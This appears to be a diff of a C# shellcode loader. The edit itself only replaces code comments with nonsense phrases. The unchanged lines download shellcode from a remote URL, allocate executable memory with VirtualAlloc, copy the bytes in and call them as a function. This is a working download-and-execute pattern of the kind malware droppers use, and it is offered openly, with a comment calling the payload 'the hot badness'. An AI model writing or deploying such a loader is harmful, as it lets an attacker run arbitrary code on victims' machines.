@@ -71,7 +71,7 @@ namespace Code
 
 
 
-            //Download the hot badness
+            //Download for great justice
             WebRequest webRequest = WebRequest.Create(mattsHot);
             webRequest.Method = WebRequestMethods.Http.Get;
             WebResponse webResponse = webRequest.GetResponse();
@@ -80,7 +80,7 @@ namespace Code
             shellcode = reader.ReadToEnd();
             webResponseStream.Close();
 
-            //Make a byte array
+            //Make a byte array flazzle zazzle
             byte[] sc = new byte[shellcode.Length];
 
             for (int i = 0; i < shellcode.Length; i++)
@@ -88,7 +88,7 @@ namespace Code
                 sc[i] = Convert.ToByte(shellcode[i]);
             }
 
-            // Allocate RWX memory for the shellcode
+            // Allocate RWX memory for the shellcode jello puddin pops
             IntPtr baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
             System.Diagnostics.Debug.Assert(baseAddr != IntPtr.Zero, "Error: Couldn't allocate remote memory");
 
@@ -97,7 +97,7 @@ namespace Code
                 // Copy shellcode to RWX buffer
                 Marshal.Copy(sc, 0, baseAddr, sc.Length);
 
-                // Get pointer to function created in memory
+                // Get pointer to function created in memory durker durr
                 ExecuteDelegate del = (ExecuteDelegate)Marshal.GetDelegateForFunctionPointer(baseAddr, typeof(ExecuteDelegate));
 
                 del();
